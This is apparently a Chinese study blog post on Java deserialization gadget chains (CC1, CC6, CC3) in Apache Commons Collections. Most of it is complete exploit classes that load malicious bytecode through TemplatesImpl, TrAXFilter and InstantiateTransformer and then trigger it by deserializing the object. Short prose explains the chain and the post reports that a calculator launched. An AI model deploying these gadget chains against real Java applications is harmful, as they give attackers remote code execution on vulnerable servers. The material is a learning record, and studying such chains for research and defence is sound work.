import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  import org.apache.commons.collections.Transformer;  import org.apache.commons.collections.functors.ChainedTransformer;  import org.apache.commons.collections.functors.ConstantTransformer;  import org.apache.commons.collections.functors.InvokerTransformer;  import org.apache.commons.collections.map.LazyMap;    import java.io.ByteArrayInputStream;  import java.io.ByteArrayOutputStream;  import java.io.ObjectInputStream;  import java.io.ObjectOutputStream;  import java.lang.reflect.Constructor;  import java.lang.reflect.Field;  import java.lang.reflect.InvocationHandler;  import java.lang.reflect.Proxy;  import java.nio.file.Files;  import java.nio.file.Paths;  import java.util.HashMap;  import java.util.Map;    public class cc1 &#123;      public static void main(String[] args) throws Exception &#123;          TemplatesImpl templates = new TemplatesImpl();          Class&lt;? extends TemplatesImpl&gt; bClass = templates.getClass();          Field name = bClass.getDeclaredField(&quot;_name&quot;);          name.setAccessible(true);          name.set(templates,&quot;nihao&quot;);          byte[] bytes = Files.readAllBytes(Paths.get(&quot;C://nihao.class&quot;));            Field bytecodes = bClass.getDeclaredField(&quot;_bytecodes&quot;);          bytecodes.setAccessible(true);          bytecodes.set(templates,new byte[][]&#123;bytes&#125;);            Field tfactory = bClass.getDeclaredField(&quot;_tfactory&quot;);          tfactory.setAccessible(true);          tfactory.set(templates, new TransformerFactoryImpl() );          Transformer[] transformers = new Transformer[]&#123;                  new ConstantTransformer(templates),                  new InvokerTransformer(&quot;newTransformer&quot;,null,null)          &#125;;          HashMap&lt;Object, Object&gt; oObjectHashMap = new HashMap&lt;&gt;();            Transformer chain = new ChainedTransformer(transformers);          Map decorate = LazyMap.decorate(oObjectHashMap, chain);            Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);          Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);          declaredConstructor.setAccessible(true);            // 内层 handler：memberValues = LazyMap          InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorate);            // 代理对象：handler 作为 InvocationHandler        Map proxyInstance = (Map) Proxy.newProxyInstance(                  Map.class.getClassLoader(),                  new Class[]&#123;Map.class&#125;,                  handler          );            // 外层 handler：memberValues = proxyInstance，作为反序列化入口          InvocationHandler hander1 = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyInstance);            // ===== 序列化 =====        ByteArrayOutputStream barr = new ByteArrayOutputStream();          ObjectOutputStream oos = new ObjectOutputStream(barr);          oos.writeObject(hander1);          oos.close();            System.out.println(&quot;序列化完成，字节数: &quot; + barr.size());            // ===== 反序列化（触发） =====        System.out.println(&quot;开始反序列化...&quot;);          ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));          ois.readObject();          ois.close();      &#125;  &#125;
  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  import org.apache.commons.collections.Transformer;  import org.apache.commons.collections.functors.ConstantTransformer;  import org.apache.commons.collections.functors.InvokerTransformer;  import org.apache.commons.collections.functors.ChainedTransformer;  import org.apache.commons.collections.map.TransformedMap;    import java.io.*;  import java.lang.annotation.Target;  import java.lang.reflect.Constructor;  import java.lang.reflect.Field;  import java.nio.file.Files;  import java.nio.file.Paths;  import java.util.HashMap;  import java.util.Map;    // 解决了第一个问题  public class CC1Step1 &#123;      public static void main(String[] args) throws Exception &#123;          TemplatesImpl templates = new TemplatesImpl();          Class&lt;? extends TemplatesImpl&gt; aClass = templates.getClass();          Field name = aClass.getDeclaredField(&quot;_name&quot;);          name.setAccessible(true);          name.set(templates,&quot;nihao&quot;);          byte[] bytes = Files.readAllBytes(Paths.get(&quot;C://nihao.class&quot;));            Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);          bytecodes.setAccessible(true);          bytecodes.set(templates,new byte[][]&#123;bytes&#125;);            Field tfactory = aClass.getDeclaredField(&quot;_tfactory&quot;);          tfactory.setAccessible(true);          tfactory.set(templates, new TransformerFactoryImpl() );          Transformer[] transformers = new Transformer[]&#123;                  new ConstantTransformer(templates),                  new InvokerTransformer(&quot;newTransformer&quot;,null,null)          &#125;;          ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);          HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();          hashMap.put(&quot;value&quot;,&quot;cc&quot;);          Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);          Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);          Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);          aihConstructor.setAccessible(true);          Object o = aihConstructor.newInstance(Target.class, transformedMap);            // 序列化反序列化          serialize(o);          unserialize(&quot;ser.bin&quot;);      &#125;      public static void serialize(Object obj) throws IOException &#123;          ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));          oos.writeObject(obj);      &#125;      public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;          ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));          Object obj = ois.readObject();          return obj;      &#125;  &#125;
 cc6改造  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  import org.apache.commons.collections.Transformer;  import org.apache.commons.collections.functors.ChainedTransformer;  import org.apache.commons.collections.functors.ConstantTransformer;  import org.apache.commons.collections.functors.InvokerTransformer;  import org.apache.commons.collections.keyvalue.TiedMapEntry;  import org.apache.commons.collections.map.LazyMap;    import javax.xml.crypto.dsig.Transform;  import java.io.ByteArrayInputStream;  import java.io.ByteArrayOutputStream;  import java.io.ObjectInputStream;  import java.io.ObjectOutputStream;  import java.lang.reflect.Field;  import java.nio.file.Files;  import java.nio.file.Paths;  import java.util.HashMap;  import java.util.Map;    public class cc2 &#123;      public static void main(String[] args) throws Exception &#123;          HashMap&lt;Object, Object&gt; objectObjectHashMap = new HashMap&lt;&gt;();  //        Runtime runtime = Runtime.getRuntime();  //        InvokerTransformer exec = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);          TemplatesImpl templates = new TemplatesImpl();          Class&lt;? extends TemplatesImpl&gt; aClass = templates.getClass();          Field name = aClass.getDeclaredField(&quot;_name&quot;);          name.setAccessible(true);          name.set(templates,&quot;nihao&quot;);          byte[] bytes = Files.readAllBytes(Paths.get(&quot;C://nihao.class&quot;));            Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);          bytecodes.setAccessible(true);          bytecodes.set(templates,new byte[][]&#123;bytes&#125;);            Field tfactory = aClass.getDeclaredField(&quot;_tfactory&quot;);          tfactory.setAccessible(true);          tfactory.set(templates, new TransformerFactoryImpl() );          Transformer[] transformers = new Transformer[]&#123;                  new ConstantTransformer(templates),                  new InvokerTransformer(&quot;newTransformer&quot;,null,null)          &#125;;          ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;new ConstantTransformer(&quot;This is fake!!!&quot;)&#125;);              Map decorate = LazyMap.decorate(objectObjectHashMap, chainedTransformer);          TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,&quot;niao&quot;);  //        tiedMapEntry.getValue();          HashMap&lt;Object, Object&gt; cc2hashmap = new HashMap&lt;&gt;();          cc2hashmap.put(tiedMapEntry,&quot;thankyou&quot;);          objectObjectHashMap.remove(&quot;niao&quot;);          Field iTransformers = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);          iTransformers.setAccessible(true);          iTransformers.set(chainedTransformer,transformers);            // 序列化          ByteArrayOutputStream baos = new ByteArrayOutputStream();          ObjectOutputStream oos = new ObjectOutputStream(baos);          oos.writeObject(cc2hashmap);          oos.close();            // 反序列化（触发）          ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));          ois.readObject();        &#125;  &#125;
TrAXFilter 与 InstantiateTransformer 接下来回到cc3链 接着往前找 public class TrAXFilter extends XMLFilterImpl &#123;     private Templates              _templates;     private TransformerImpl        _transformer;     private TransformerHandlerImpl _transformerHandler;     private boolean _useServicesMechanism = true;      public TrAXFilter(Templates templates)  throws         TransformerConfigurationException     &#123;         _templates = templates;         _transformer = (TransformerImpl) templates.newTransformer();         _transformerHandler = new TransformerHandlerImpl(_transformer);         _useServicesMechanism = _transformer.useServicesMechnism();     &#125; 我们选择这个因为只要执行构造方法就可以触发了 cc3解决的问题是invoketransformer被禁用的情况，所以接着往下找，作者采用了InstantiateTransformer的transform方法，我们也用这个构造exp InstantiateTransformer的transform方法实现了输入一个Class然后调用这个类的构造方法去实例化一个类 这里还是稍微有点难理解的，TrAXFilter要输入一个template作为参数，然后他在调用构造方法进行实例化的时候会触发我们想要的那个方法， 然后我们用InstantiateTransformer的方法来执行，首先实例化输入的是 TrAXFilter的参数类型和参数，transform方法输入的是Class对象，它进行构造的时候让链条运行起来  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  import org.apache.commons.collections.Transformer;  import org.apache.commons.collections.functors.ChainedTransformer;  import org.apache.commons.collections.functors.ConstantTransformer;  import org.apache.commons.collections.functors.InstantiateTransformer;  import org.apache.commons.collections.functors.InvokerTransformer;  import org.apache.commons.collections.keyvalue.TiedMapEntry;  import org.apache.commons.collections.map.LazyMap;    import javax.xml.transform.Templates;  import javax.xml.transform.TransformerFactory;  import java.io.ByteArrayInputStream;  import java.io.ByteArrayOutputStream;  import java.io.ObjectInputStream;  import java.io.ObjectOutputStream;  import java.lang.reflect.Field;  import java.lang.reflect.Method;  import java.net.URL;  import java.net.URLClassLoader;  import java.nio.file.Files;  import java.nio.file.Path;  import java.nio.file.Paths;  import java.util.HashMap;  import java.util.Map;    public class filerce &#123;      public static void main(String[] args) throws Exception &#123;          TemplatesImpl templates = new TemplatesImpl();          Class&lt;? extends TemplatesImpl&gt; aClass = templates.getClass();          Field name = aClass.getDeclaredField(&quot;_name&quot;);          name.setAccessible(true);          name.set(templates,&quot;nihao&quot;);          byte[] bytes = Files.readAllBytes(Paths.get(&quot;C://nihao.class&quot;));            Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);          bytecodes.setAccessible(true);          bytecodes.set(templates,new byte[][]&#123;bytes&#125;);            Field tfactory = aClass.getDeclaredField(&quot;_tfactory&quot;);          tfactory.setAccessible(true);          tfactory.set(templates, new TransformerFactoryImpl() );  //        templates.newTransformer();          InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);          instantiateTransformer.transform(TrAXFilter.class);
使用 CC6 前半链补全接下来找谁调用了transform就可以了，这都是现成的，我用cc6的前半部分补全链条
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  import org.apache.commons.collections.Transformer;  import org.apache.commons.collections.functors.ChainedTransformer;  import org.apache.commons.collections.functors.ConstantTransformer;  import org.apache.commons.collections.functors.InstantiateTransformer;  import org.apache.commons.collections.functors.InvokerTransformer;  import org.apache.commons.collections.keyvalue.TiedMapEntry;  import org.apache.commons.collections.map.LazyMap;    import javax.xml.transform.Templates;  import javax.xml.transform.TransformerFactory;  import java.io.ByteArrayInputStream;  import java.io.ByteArrayOutputStream;  import java.io.ObjectInputStream;  import java.io.ObjectOutputStream;  import java.lang.reflect.Field;  import java.lang.reflect.Method;  import java.net.URL;  import java.net.URLClassLoader;  import java.nio.file.Files;  import java.nio.file.Path;  import java.nio.file.Paths;  import java.util.HashMap;  import java.util.Map;    public class filerce &#123;      public static void main(String[] args) throws Exception &#123;          TemplatesImpl templates = new TemplatesImpl();          Class&lt;? extends TemplatesImpl&gt; aClass = templates.getClass();          Field name = aClass.getDeclaredField(&quot;_name&quot;);          name.setAccessible(true);          name.set(templates,&quot;nihao&quot;);          byte[] bytes = Files.readAllBytes(Paths.get(&quot;C://nihao.class&quot;));            Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);          bytecodes.setAccessible(true);          bytecodes.set(templates,new byte[][]&#123;bytes&#125;);            Field tfactory = aClass.getDeclaredField(&quot;_tfactory&quot;);          tfactory.setAccessible(true);          tfactory.set(templates, new TransformerFactoryImpl() );  //        templates.newTransformer();          InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);  //        instantiateTransformer.transform(TrAXFilter.class);          Transformer[] transformers = new Transformer[]&#123;                  new ConstantTransformer(TrAXFilter.class),                  instantiateTransformer          &#125;;          ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;new ConstantTransformer(&quot;This is fake!!!&quot;)&#125;);            HashMap&lt;Object, Object&gt; objectObjectHashMap = new HashMap&lt;&gt;();          Map decorate = LazyMap.decorate(objectObjectHashMap, chainedTransformer);          TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,&quot;niao&quot;);  //        tiedMapEntry.getValue();          HashMap&lt;Object, Object&gt; cc2hashmap = new HashMap&lt;&gt;();          cc2hashmap.put(tiedMapEntry,&quot;thankyou&quot;);          objectObjectHashMap.remove(&quot;niao&quot;);          Field iTransformers = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);          iTransformers.setAccessible(true);          iTransformers.set(chainedTransformer,transformers);            // 序列化          ByteArrayOutputStream baos = new ByteArrayOutputStream();          ObjectOutputStream oos = new ObjectOutputStream(baos);          oos.writeObject(cc2hashmap);          oos.close();            // 反序列化（触发）          ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));          ois.readObject();          &#125;  &#125;
成功弹出计算器我们三天的努力学习没有白费，cc3也成功跑通了
使用 CC1 前半链补全import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  import org.apache.commons.collections.Transformer;  import org.apache.commons.collections.functors.ChainedTransformer;  import org.apache.commons.collections.functors.ConstantTransformer;  import org.apache.commons.collections.functors.InstantiateTransformer;  import org.apache.commons.collections.keyvalue.TiedMapEntry;  import org.apache.commons.collections.map.LazyMap;    import javax.xml.transform.Templates;  import java.io.ByteArrayInputStream;  import java.io.ByteArrayOutputStream;  import java.io.ObjectInputStream;  import java.io.ObjectOutputStream;  import java.lang.reflect.Field;  import java.nio.file.Files;  import java.nio.file.Paths;  import java.util.HashMap;  import java.util.Map;    public class  CC1Step1&#123;      public static void main(String[] args) throws Exception &#123;          TemplatesImpl templates = new TemplatesImpl();          Class&lt;? extends TemplatesImpl&gt; aClass = templates.getClass();          Field name = aClass.getDeclaredField(&quot;_name&quot;);          name.setAccessible(true);          name.set(templates, &quot;nihao&quot;);          byte[] bytes = Files.readAllBytes(Paths.get(&quot;C://nihao.class&quot;));            Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);          bytecodes.setAccessible(true);          bytecodes.set(templates, new byte[][]&#123;bytes&#125;);            Field tfactory = aClass.getDeclaredField(&quot;_tfactory&quot;);          tfactory.setAccessible(true);          tfactory.set(templates, new TransformerFactoryImpl());            InstantiateTransformer instantiateTransformer =                  new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);            Transformer[] transformers = new Transformer[]&#123;                  new ConstantTransformer(TrAXFilter.class),                  instantiateTransformer          &#125;;            ChainedTransformer chainedTransformer =                  new ChainedTransformer(new Transformer[]&#123;new ConstantTransformer(&quot;This is fake!!!&quot;)&#125;);            HashMap&lt;Object, Object&gt; objectObjectHashMap = new HashMap&lt;&gt;();          Map decorate = LazyMap.decorate(objectObjectHashMap, chainedTransformer);          TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, &quot;niao&quot;);            HashMap&lt;Object, Object&gt; cc3hashmap = new HashMap&lt;&gt;();          cc3hashmap.put(tiedMapEntry, &quot;thankyou&quot;);          objectObjectHashMap.remove(&quot;niao&quot;);            Field iTransformers = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);          iTransformers.setAccessible(true);          iTransformers.set(chainedTransformer, transformers);            ByteArrayOutputStream baos = new ByteArrayOutputStream();          ObjectOutputStream oos = new ObjectOutputStream(baos);          oos.writeObject(cc3hashmap);          oos.close();            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));          ois.readObject();          ois.close();      &#125;  &#125;

调用链回顾与学习总结这是用cc1补全形成的链条cc3学习结束了，反序列化真难啊还是要复习一下这条链新发现的额前半部分，首先是通过TemplatesImpl.java来加载恶意的class，我们发现他重写了defineclass，然后找到defineTransletClasses调用了它，getTransletInstance又调用了defineTransletClasses，然后在这个方法里面还进行了实例化，接着找newTransformer调用了这个方法，这个是公共的可以被调用了，这个基本加载恶意字节码的调用完成了，为了凑成完整的链条，接着往前找，找到了TrAXFilter.java，这个类的构造函数里直接调用了，由于cc3不使用invoketransformer，所以引进了一个新的来 InstantiateTransformer来实例化它从而触发，其他的前面的部分可以沿用cc1和cc6.
至此真正的结束了，耗时三天完成，希望下面的内容可以简单一点

